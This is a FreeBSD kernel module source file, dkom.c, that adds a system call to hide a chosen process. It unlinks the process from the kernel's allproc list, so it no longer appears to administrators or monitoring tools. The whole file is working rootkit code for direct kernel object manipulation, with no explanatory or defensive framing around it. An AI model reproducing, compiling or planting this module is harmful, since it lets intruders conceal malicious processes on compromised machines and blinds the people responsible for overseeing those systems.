/* dkom.c
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>

struct SYS_dkom_args
{
	int pid;
};

static int SYS_dkom(struct thread* td, void* syscall_args)
{
	struct SYS_dkom_args* args = (struct SYS_dkom_args*) syscall_args;
	struct proc *p;
  (void) uprintf("SYS_dkom(%d)\n", args->pid);
	sx_xlock(&allproc_lock); /* Lock to access the list */
	/* Browse the allproc list
   */
	LIST_FOREACH(p, &allproc, p_list)
  {
		PROC_LOCK(p); /* Lock the current entry */
		if (p->p_pid == args->pid)
    {
      LIST_REMOVE(p, p_list);
      (void) uprintf("hide %d succeeded\n", args->pid);
		}
		PROC_UNLOCK(p);
	}
	sx_xunlock(&allproc_lock);

	return 0;
}


static struct sysent dkom_sysent = { 1, (sy_call_t*) SYS_dkom };
static int number = NO_SYSCALL; /* Let's the kernel decide */

static int module_handler(struct module *module, int cmd, void *arg)
{
	int error = 0;
	switch (cmd)
  {
	case MOD_LOAD:
      (void) uprintf("SYS_dkom registered at %d\n", number);
      break;
      
	case MOD_UNLOAD:
      (void) uprintf("SYS_dkom unregistered\n");
      break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return error;
}

SYSCALL_MODULE(dkom, &number, &dkom_sysent, module_handler, NULL);
